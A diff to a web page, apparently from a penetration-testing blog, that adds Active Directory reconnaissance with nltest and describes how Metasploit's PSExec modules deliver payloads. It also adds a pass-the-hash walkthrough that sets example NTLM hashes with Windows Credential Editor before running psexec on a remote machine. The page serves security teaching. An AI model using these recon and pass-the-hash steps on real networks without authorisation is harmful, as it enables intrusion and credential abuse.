@@ -34,10 +34,11 @@
     <script type="text/javascript" src="_static/jquery.js"></script>
     <script type="text/javascript" src="_static/underscore.js"></script>
     <script type="text/javascript" src="_static/doctools.js"></script>
+    <script type="text/javascript" src="_static/disqus.js"></script>
     <link rel="search" title="Search" href="search.html" />
     <link rel="top" title="tech.bitvijays.com" href="index.html" />
     <link rel="next" title="Learning from the field : Securing your Debian" href="LFFSecuringDebian.html" />
-    <link rel="prev" title="The Magic of Learning" href="index.html" /> 
+    <link rel="prev" title="Learning from the field: Gathering Windows Credentials &amp; High-Impact Exploitation" href="LFFPostExploitation.html" /> 
   </head>
   <body role="document">
     <div class="related" role="navigation" aria-label="related navigation">
@@ -47,7 +48,7 @@
           <a href="LFFSecuringDebian.html" title="Learning from the field : Securing your Debian"
              accesskey="N">next</a></li>
         <li class="right" >
-          <a href="index.html" title="The Magic of Learning"
+          <a href="LFFPostExploitation.html" title="Learning from the field: Gathering Windows Credentials &amp; High-Impact Exploitation"
              accesskey="P">previous</a> |</li>
         <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
       </ul>
@@ -62,6 +63,9 @@
 <li><a class="reference internal" href="#enum4linux">Enum4linux</a></li>
 <li><a class="reference internal" href="#active-directory-explorer-adexplorer">Active Directory Explorer ADExplorer</a></li>
 <li><a class="reference internal" href="#jxplorer">JXplorer</a></li>
+<li><a class="reference internal" href="#remote-server-administration-tools">Remote Server Administration Tools</a></li>
+<li><a class="reference internal" href="#microsoft-active-directory-topology-diagrammer">Microsoft Active Directory Topology Diagrammer</a></li>
+<li><a class="reference internal" href="#nltest">nltest</a></li>
 <li><a class="reference internal" href="#netdom">netdom</a></li>
 <li><a class="reference internal" href="#get-sessions-of-remote-machines">Get sessions of remote machines</a></li>
 <li><a class="reference internal" href="#view-users-in-domain-workgroup">View users in Domain / Workgroup</a></li>
@@ -97,8 +101,8 @@
 </ul>
 
   <h4>Previous topic</h4>
-  <p class="topless"><a href="index.html"
-                        title="previous chapter">The Magic of Learning</a></p>
+  <p class="topless"><a href="LFFPostExploitation.html"
+                        title="previous chapter">Learning from the field: Gathering Windows Credentials &amp; High-Impact Exploitation</a></p>
   <h4>Next topic</h4>
   <p class="topless"><a href="LFFSecuringDebian.html"
                         title="next chapter">Learning from the field : Securing your Debian</a></p>
@@ -131,7 +135,7 @@
             
   <div class="section" id="learning-from-the-field-active-directory-recon-and-administrative-shells">
 <h1>Learning from the field : Active Directory Recon and Administrative shells<a class="headerlink" href="#learning-from-the-field-active-directory-recon-and-administrative-shells" title="Permalink to this headline">¶</a></h1>
-<p>Once, we have access to <strong>credentials of a domain user of windows domain</strong>, we can utilize the credentials to do windows <strong>active directory enumeration</strong> such as figuring out the domain controllers, users, machines, trust etc. This post looks into the various methods which are available to do the enumeration such as rpclient, enum4linux, netdom, powerview, bloodhound, adexplorer, Jexplorer etc.</p>
+<p>Once, we have access to <strong>credentials of a domain user of windows domain</strong>, we can utilize the credentials to do windows <strong>active directory enumeration</strong> such as figuring out the domain controllers, users, machines, trust etc. This post looks into the various methods which are available to do the enumeration such as rpclient, enum4linux, nltest, netdom, powerview, bloodhound, adexplorer, Jexplorer, Remote Server Administration Tools, Microsoft Active Diretory Topology Diagrammer etc.</p>
 <p>Also, once we have <strong>administrative credentials</strong> there are multiple ways to get a <strong>execute remote commands</strong> on the remote machine such winexe, crackmapexec, impacket psexec, smbexec, wmiexec, Metasploit psexec, Sysinternals psexec, task scheduler, remote registry, WinRM, WMI, DCOM, remote desktop etc. We have a look over all the methods with possible examples.</p>
 <p>Did we missed something? please send us a pull request and we will add it.</p>
 <div class="section" id="recon-active-directory">
@@ -378,6 +382,129 @@ min_password_length: 8
 <div class="section" id="jxplorer">
 <h3>JXplorer<a class="headerlink" href="#jxplorer" title="Permalink to this headline">¶</a></h3>
 <p><a class="reference external" href="http://jxplorer.org/">JXplorer</a> is a cross platform LDAP browser and editor. It is a standards compliant general purpose LDAP client that can be used to search, read and edit any standard LDAP directory, or any directory service with an LDAP or DSML interface.</p>
+</div>
+<div class="section" id="remote-server-administration-tools">
+<h3>Remote Server Administration Tools<a class="headerlink" href="#remote-server-administration-tools" title="Permalink to this headline">¶</a></h3>
+<p>Active Directory Domain Services (AD DS) Tools and Active Directory Lightweight Directory Services (AD LDS) Tools includes Active Directory Administrative Center; Active Directory Domains and Trusts; Active Directory Sites and Services; Active Directory Users and Computers; ADSI Edit; DCPromo.exe; LDP.exe; NetDom.exe; NTDSUtil.exe; RepAdmin.exe; Active Directory module for Windows PowerShell; DCDiag.exe; DSACLs.exe; DSAdd.exe; DSDBUtil.exe; DSMgmt.exe; DSMod.exe; DSMove.exe; DSQuery.exe; DSRm.exe; GPFixup.exe; KSetup.exe; KtPass.exe; NlTest.exe; NSLookup.exe; W32tm.exe.</p>
+<p>Active Directory Administrative Center; Active Directory Domains and Trusts; Active Directory Sites and Services; Active Directory Users and Computers; ADSI Edit;  are GUI tools. These can be installed by installing <a class="reference external" href="https://support.microsoft.com/en-in/help/2693643/remote-server-administration-tools-rsat-for-windows-operating-systems">Remote Server Administration Tools</a></p>
+</div>
+<div class="section" id="microsoft-active-directory-topology-diagrammer">
+<h3>Microsoft Active Directory Topology Diagrammer<a class="headerlink" href="#microsoft-active-directory-topology-diagrammer" title="Permalink to this headline">¶</a></h3>
+<p>The <a class="reference external" href="https://www.microsoft.com/en-in/download/details.aspx?id=13380">Microsoft Active Directory Topology Diagrammer</a> reads an Active Directory configuration using LDAP, and then automatically generates a Visio diagram of your Active Directory and /or your Exchange Server topology. The diagramms may include domains, sites, servers, organizational units, DFS-R, administrative groups, routing groups and connectors and can be changed manually in Visio if needed.</p>
+</div>
+<div class="section" id="nltest">
+<h3>nltest<a class="headerlink" href="#nltest" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="https://technet.microsoft.com/en-us/library/cc731935(v=ws.11).aspx">Nltest</a> is a command-line tool to perform network administrative tasks. We could figure out the Domain Controllers/ Domain Trusts using it. It is built into Windows Server 2008 and Windows Server 2008 R2. It is available if you have the AD DS or the AD LDS server role installed. It is also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT).</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>nltest /?
+Usage: nltest [/OPTIONS]
+
+
+   /SERVER:&lt;ServerName&gt; - Specify &lt;ServerName&gt;
+
+   /QUERY - Query &lt;ServerName&gt; netlogon service
+   /DCLIST:&lt;DomainName&gt; - Get list of DC&#39;s for &lt;DomainName&gt;
+   /DCNAME:&lt;DomainName&gt; - Get the PDC name for &lt;DomainName&gt;
+   /DSGETDC:&lt;DomainName&gt; - Call DsGetDcName /PDC /DS /DSP /GC /KDC /TIMESERV /GTIMESERV /WS /NETBIOS /DNS /IP /FORCE /WRITABLE /AVOIDSELF /LDAPONLY /BACKG /DS_6
+       /TRY_NEXT_CLOSEST_SITE /SITE:&lt;SiteName&gt; /ACCOUNT:&lt;AccountName&gt; /RET_DNS /RET_NETBIOS
+   /DNSGETDC:&lt;DomainName&gt; - Call DsGetDcOpen/Next/Close /PDC /GC /KDC /WRITABLE /LDAPONLY /FORCE /SITESPEC
+   /DSGETFTI:&lt;DomainName&gt; - Call DsGetForestTrustInformation /UPDATE_TDO
+   /DSGETSITE - Call DsGetSiteName
+   /DSGETSITECOV - Call DsGetDcSiteCoverage
+   /DSADDRESSTOSITE:[MachineName] - Call DsAddressToSiteNamesEx        /ADDRESSES:&lt;Address1,Address2,...&gt;
+   /PARENTDOMAIN - Get the name of the parent domain of this machine
+   /WHOWILL:&lt;Domain&gt;* &lt;User&gt; [&lt;Iteration&gt;] - See if &lt;Domain&gt; will log on &lt;User&gt;
+   /FINDUSER:&lt;User&gt; - See which trusted domain will log on &lt;User&gt;
+   /USER:&lt;UserName&gt; - Query User info on &lt;ServerName&gt;
+   /TIME:&lt;Hex LSL&gt; &lt;Hex MSL&gt; - Convert NT GMT time to ascii
+   /LOGON_QUERY - Query number of cumulative logon attempts
+   /DOMAIN_TRUSTS - Query domain trusts on &lt;ServerName&gt;
+       /PRIMARY /FOREST /DIRECT_OUT /DIRECT_IN /ALL_TRUSTS /V
+</pre></div>
+</div>
+<p>Examples:</p>
+<ul class="simple">
+<li>Verify domain controllers in a domain</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nltest</span> <span class="o">/</span><span class="n">dclist</span><span class="p">:</span><span class="n">xxx</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span>
+<span class="n">Get</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">DCs</span> <span class="ow">in</span> <span class="n">domain</span> <span class="s1">&#39;xxx.example.net&#39;</span> <span class="kn">from</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">ABCDEFG.xxx.example.net&#39;</span><span class="o">.</span>
+      <span class="n">ABCDEFG1</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span>        <span class="p">[</span><span class="n">DS</span><span class="p">]</span> <span class="n">Site</span><span class="p">:</span> <span class="n">XX</span><span class="o">-</span><span class="n">SriLanka</span>
+      <span class="n">ABCDEFG2</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span>        <span class="p">[</span><span class="n">DS</span><span class="p">]</span> <span class="n">Site</span><span class="p">:</span> <span class="n">XX</span><span class="o">-</span><span class="n">India</span>
+      <span class="n">ABCDEFG5</span><span class="o">.</span><span class="n">xxx</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span> <span class="p">[</span><span class="n">PDC</span><span class="p">]</span>  <span class="p">[</span><span class="n">DS</span><span class="p">]</span> <span class="n">Site</span><span class="p">:</span> <span class="n">XX</span><span class="o">-</span><span class="n">Bangladesh</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Advanced information about users</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nltest</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="s2">&quot;TestAdmin&quot;</span>
+<span class="n">User</span><span class="p">:</span> <span class="n">User1</span>
+<span class="n">Rid</span><span class="p">:</span> <span class="mh">0x3eb</span>
+<span class="n">Version</span><span class="p">:</span> <span class="mh">0x10002</span>
+<span class="n">LastLogon</span><span class="p">:</span> <span class="mi">2</span><span class="n">ee61c9a</span> <span class="mi">01</span><span class="n">c0e947</span> <span class="o">=</span> <span class="mi">5</span><span class="o">/</span><span class="mi">30</span><span class="o">/</span><span class="mi">2001</span> <span class="mi">13</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">10</span>
+<span class="n">PasswordLastSet</span><span class="p">:</span> <span class="mi">9</span><span class="n">dad5428</span> <span class="mi">01</span><span class="n">c0e577</span> <span class="o">=</span> <span class="mi">5</span><span class="o">/</span><span class="mi">25</span><span class="o">/</span><span class="mi">2001</span> <span class="mi">17</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">47</span>
+<span class="n">AccountExpires</span><span class="p">:</span> <span class="n">ffffffff</span> <span class="mi">7</span><span class="n">fffffff</span> <span class="o">=</span> <span class="mi">9</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="mi">30828</span> <span class="mi">19</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">05</span>
+<span class="n">PrimaryGroupId</span><span class="p">:</span> <span class="mh">0x201</span>
+<span class="n">UserAccountControl</span><span class="p">:</span> <span class="mh">0x210</span>
+<span class="n">CountryCode</span><span class="p">:</span> <span class="mh">0x0</span>
+<span class="n">CodePage</span><span class="p">:</span> <span class="mh">0x0</span>
+<span class="n">BadPasswordCount</span><span class="p">:</span> <span class="mh">0x0</span>
+<span class="n">LogonCount</span><span class="p">:</span> <span class="mh">0x33</span>
+<span class="n">AdminCount</span><span class="p">:</span> <span class="mh">0x1</span>
+<span class="n">SecurityDescriptor</span><span class="p">:</span> <span class="mi">80140001</span> <span class="mi">0000009</span><span class="n">c</span> <span class="mi">000000</span><span class="n">ac</span> <span class="mi">00000014</span> <span class="mi">00000044</span> <span class="mi">00300002</span> <span class="mi">000000</span>
+<span class="mi">02</span> <span class="mi">0014</span><span class="n">c002</span> <span class="mi">01050045</span> <span class="mi">00000101</span> <span class="mi">01000000</span> <span class="mi">00000000</span> <span class="mi">0014</span><span class="n">c002</span> <span class="mi">000</span><span class="n">f07ff</span> <span class="mi">00000101</span> <span class="mi">05000</span>
+<span class="mi">000</span> <span class="mi">00000007</span> <span class="mi">00580012</span> <span class="mi">00000003</span> <span class="mi">00240000</span> <span class="mi">00020044</span> <span class="mi">00000501</span> <span class="mi">05000000</span> <span class="mi">00000015</span> <span class="mi">22</span><span class="n">cd</span>
+<span class="n">b7b4</span> <span class="mi">7112</span><span class="n">b3f1</span> <span class="mi">2</span><span class="n">b3be507</span> <span class="mi">000003</span><span class="n">eb</span> <span class="mi">00180000</span> <span class="mi">000</span><span class="n">f07ff</span> <span class="mi">00000201</span> <span class="mi">05000000</span> <span class="mi">00000020</span> <span class="mi">000</span>
+<span class="mi">00220</span> <span class="mi">00140000</span> <span class="mi">0002035</span><span class="n">b</span> <span class="mi">00000101</span> <span class="mi">01000000</span> <span class="mi">00000000</span> <span class="mi">00000201</span> <span class="mi">05000000</span> <span class="mi">00000020</span> <span class="mi">00</span>
+<span class="mi">000220</span> <span class="mi">00000201</span> <span class="mi">05000000</span> <span class="mi">00000020</span> <span class="mi">00000220</span>
+ <span class="n">AccountName</span><span class="p">:</span> <span class="n">User1</span>
+<span class="n">Groups</span><span class="p">:</span> <span class="mi">00000201</span> <span class="mi">00000007</span>
+<span class="n">LmOwfPassword</span><span class="p">:</span> <span class="n">fb890c9c</span> <span class="mi">5</span><span class="n">c7e7e09</span> <span class="n">ee58593b</span> <span class="n">d959c681</span>
+<span class="n">NtOwfPassword</span><span class="p">:</span> <span class="n">d82759cc</span> <span class="mi">81</span><span class="n">a342ac</span> <span class="n">df600c37</span> <span class="mf">4e58</span><span class="n">a478</span>
+<span class="n">NtPasswordHistory</span><span class="p">:</span> <span class="mi">00011001</span>
+<span class="n">LmPasswordHistory</span><span class="p">:</span> <span class="mi">00010011</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Determine the PDC emulator for a domain</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nltest</span> <span class="o">/</span><span class="n">dcname</span><span class="p">:</span><span class="n">fourthcoffee</span>
+<span class="n">PDC</span> <span class="k">for</span> <span class="n">Domain</span> <span class="n">fourthcoffee</span> <span class="ow">is</span> \\<span class="n">fourthcoffee</span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="mi">01</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Show trust relationships for a domain</li>
+</ul>
+<blockquote>
+<div><p>Returns a list of trusted domains. /Primary /Forest /Direct_Out /Direct_In /All_Trusts /v.</p>
+<p>The following list shows the values that you can use to filter the list of domains.</p>
+<ul class="simple">
+<li>/Primary: Returns only the domain to which the computer account belongs.</li>
+<li>/Forest: Returns only those domains that are in the same forest as the primary domain.</li>
+<li>/Direct_Out: Returns only the domains that are explicitly trusted with the primary domain.</li>
+<li>/Direct_In: Returns only the domains that explicitly trust the primary domain.</li>
+<li>/All_Trusts: Returns all trusted domains.</li>
+<li>/v: Displays verbose output, including any domain SIDs and GUIDs that are available.</li>
+</ul>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nltest</span> <span class="o">/</span><span class="n">domain_trusts</span>
+
+<span class="n">List</span> <span class="n">of</span> <span class="n">domain</span> <span class="n">trusts</span><span class="p">:</span>
+   <span class="mi">0</span><span class="p">:</span> <span class="n">ABC</span> <span class="n">abc</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span> <span class="p">(</span><span class="n">NT</span> <span class="mi">5</span><span class="p">)</span> <span class="p">(</span><span class="n">Forest</span><span class="p">:</span> <span class="mi">17</span><span class="p">)</span> <span class="p">(</span><span class="n">Direct</span> <span class="n">Outbound</span><span class="p">)</span> <span class="p">(</span><span class="n">Direct</span> <span class="n">Inbound</span><span class="p">)</span>
+   <span class="mi">1</span><span class="p">:</span> <span class="n">DEF</span> <span class="n">def</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span> <span class="p">(</span><span class="n">NT</span> <span class="mi">5</span><span class="p">)</span> <span class="p">(</span><span class="n">Forest</span><span class="p">:</span> <span class="mi">17</span><span class="p">)</span> <span class="p">(</span><span class="n">Direct</span> <span class="n">Outbound</span><span class="p">)</span> <span class="p">(</span><span class="n">Direct</span> <span class="n">Inbound</span><span class="p">)</span>
+   <span class="mi">2</span><span class="p">:</span> <span class="n">IJK</span> <span class="n">IJK</span><span class="o">.</span><span class="n">NET</span> <span class="p">(</span><span class="n">NT</span> <span class="mi">5</span><span class="p">)</span> <span class="p">(</span><span class="n">Direct</span> <span class="n">Inbound</span><span class="p">)</span> <span class="p">(</span> <span class="n">Attr</span><span class="p">:</span> <span class="mh">0x8</span> <span class="p">)</span>
+   <span class="mi">3</span><span class="p">:</span> <span class="n">LMN</span> <span class="n">LMH</span><span class="o">.</span><span class="n">net</span> <span class="p">(</span><span class="n">NT</span> <span class="mi">5</span><span class="p">)</span> <span class="p">(</span><span class="n">Direct</span> <span class="n">Outbound</span><span class="p">)</span> <span class="p">(</span> <span class="n">Attr</span><span class="p">:</span> <span class="mh">0x18</span> <span class="p">)</span>
+   <span class="mi">4</span><span class="p">:</span> <span class="n">APP</span> <span class="n">app</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">net</span> <span class="p">(</span><span class="n">NT</span> <span class="mi">5</span><span class="p">)</span> <span class="p">(</span><span class="n">Forest</span><span class="p">:</span> <span class="mi">17</span><span class="p">)</span> <span class="p">(</span><span class="n">Direct</span> <span class="n">Outbound</span><span class="p">)</span> <span class="p">(</span><span class="n">Direct</span> <span class="n">Inbound</span><span class="p">)</span> <span class="p">(</span> <span class="n">Attr</span><span class="p">:</span> <span class="mh">0x20</span> <span class="p">)</span>
+</pre></div>
+</div>
+</div></blockquote>
+<p>Thanks to <a class="reference external" href="https://twitter.com/tanoybose">Tanoy Bose</a> for informing me about this. Cheers Bose.</p>
 </div>
 <div class="section" id="netdom">
 <h3>netdom<a class="headerlink" href="#netdom" title="Permalink to this headline">¶</a></h3>
@@ -1014,6 +1141,33 @@ meterpreter &gt;
 <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">completed</span><span class="p">,</span> <span class="n">but</span> <span class="n">no</span> <span class="n">session</span> <span class="n">was</span> <span class="n">created</span><span class="o">.</span>
 </pre></div>
 </div>
+<p><strong>Working of MSF PSexec - Native Upload</strong></p>
+<p>Jonathan has already written awesome detailed blog <a class="reference external" href="https://www.toshellandback.com/2017/02/11/psexec/">Puff Puff PSExec</a> Working of MSF PSExec has been taken from his blog directly.</p>
+<p>While similar in functionality to Sysinternal’s PsExec, the Metasploit Framework’s PSExec Module has a few key differences and at a high-level performs the following actions.  By default, the module takes the following actions:</p>
+<ul class="simple">
+<li>Creates a randomly-named service executable with an embedded payload</li>
+<li>Connects to the hidden ADMIN$ share on the remote system via SMB</li>
+<li>Drops malicious service executable onto the share</li>
+<li>Utilizes the SCM to start a randomly-named service</li>
+<li>Service loads the malicious code into memory and executes it</li>
+<li>Metasploit payload handler receives payload and establishes session</li>
+<li>Module cleans up after itself, stopping the service and deleting the executable</li>
+</ul>
+<p>There is more flexibility with the Metasploit’s PSExec in comparison to Microsoft’s tool.  For instance, the default location of the malicious service executable can be modified from the hidden ADMIN$ to C$ or even another shared folder on the target machine.  Names of the service executable and associated service can also be changed under the module’s Advanced settings.</p>
+<p>However, the most important modification that a penetration tester can make is creating and linking to a custom service executable instead of relying on the executable templates provided by the Metasploit Framework.  Failure to do so greatly increases the risk of detection by the target system’s anti-virus solution once the executable is dropped to disk.</p>
+<p><strong>Working of MSF PSExec - Powershell</strong></p>
+<p>Details taken directly from Jonathan blog <a class="reference external" href="https://www.toshellandback.com/2017/02/11/psexec/">Puff Puff PSExec</a></p>
+<p>At a high-level, the psexec_psh module works as follows:</p>
+<ul class="simple">
+<li>Embed stager into a PowerShell script that will inject the payload into memory</li>
+<li>Compress and Base64 encode the PowerShell script</li>
+<li>Wrap encoded script into a PowerShell one-liner that decodes and deflates</li>
+<li>Connect to ADMIN$ share on target machine over SMB and run the one-liner</li>
+<li>Embedded script is passed into memory via PowerShell’s Invoke-Expression (IEX)</li>
+<li>Script creates a new service and passes stager payload into it</li>
+<li>Metasploit payload handler receives payload and establishes session</li>
+<li>Module cleans up after itself by tearing down the service</li>
+</ul>
 </div>
 <div class="section" id="sysinternals-psexec">
 <h3>Sysinternals psexec<a class="headerlink" href="#sysinternals-psexec" title="Permalink to this headline">¶</a></h3>
@@ -1022,6 +1176,50 @@ meterpreter &gt;
 <span class="n">command</span> <span class="n">can</span> <span class="n">be</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span><span class="o">/</span> <span class="n">ipconfig</span> <span class="n">etc</span><span class="o">.</span>
 </pre></div>
 </div>
+<p><strong>Working of Microsoft PSExec</strong></p>
+<p>The below details are taken from Jonathan blog on <a class="reference external" href="https://www.toshellandback.com/2017/02/11/psexec/">Puff Puff PSExec</a></p>
+<p>At a high-level, the PsExec program works as follows:</p>
+<ul class="simple">
+<li>Connects to the hidden ADMIN$ share (mapping to the C:Windows folder) on the remote system via SMB</li>
+<li>Utilizes the Service Control Manager (SCM) to start the PsExecsvc service and enable a named pipe on the remote system</li>
+<li>Input/output redirection of the console is achieved via the created named pipe</li>
+</ul>
+<p><strong>Sysinternal PSExec with hashes</strong></p>
+<p>Sysinternal PSExec is a tool built to assist system administrators. In order to use PsExec with captured hashes, we would require Windows Credential Editor (WCE).  This would require us to drop another executable to disk and risk detection. Fuzzynop has provided a tutorial <a class="reference external" href="http://fuzzynop.blogspot.in/2012/09/pass-hash-without-metasploit.html">Pass the Hash without Metasploit</a></p>
+<ul class="simple">
+<li>Change the current NTLM credentials</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wce</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">s</span> <span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">domain</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">lmhash</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">nthash</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>Example:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>C:\Users\test&gt;wce.exe -s testuser:amplialabs:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537
+
+WCE v1.2 (Windows Credentials Editor) - (c) 2010,2011 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
+Use -h for help.
+
+Changing NTLM credentials of current logon session (00024E1Bh) to:
+Username: testuser
+domain: amplialabs
+LMHash: 01FC5A6BE7BC6929AAD3B435B51404EE
+NTHash: 0CB6948805F797BF2A82807973B89537
+NTLM credentials successfully changed!
+
+
+C:\Users\test&gt;
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Run PSExec normally</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">psexec</span> \\<span class="n">remotecomputer</span> <span class="o">&lt;</span><span class="n">commandname</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>If you omit a user name, the process will run in the context of your account on the remote system, but will not have access to network resources (because it is impersonating). Specify a valid user name in the DomainUser syntax if the remote process requires access to network resources or to run in a different account. Since, we are omiting the username, it would run in the context of the current username ( The one we have changed with the help of WCE )</p>
+</div></blockquote>
 </div>
 <div class="section" id="task-scheduler">
 <h3>Task Scheduler<a class="headerlink" href="#task-scheduler" title="Permalink to this headline">¶</a></h3>
@@ -1372,7 +1570,7 @@ Windows                             D        0  Wed Feb 15 23:18:12 2017
 </pre></div>
 </div>
 </div></blockquote>
-</div>
+<div data-disqus-identifier="Learning from the field : Active Directory Recon and Administrative shells" data-disqus-shortname="techbitvijays" id="disqus_thread"></div></div>
 </div>
 </div>
 
@@ -1389,7 +1587,7 @@ Windows                             D        0  Wed Feb 15 23:18:12 2017
           <a href="LFFSecuringDebian.html" title="Learning from the field : Securing your Debian"
              >next</a></li>
         <li class="right" >
-          <a href="index.html" title="The Magic of Learning"
+          <a href="LFFPostExploitation.html" title="Learning from the field: Gathering Windows Credentials &amp; High-Impact Exploitation"
              >previous</a> |</li>
         <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
       </ul>
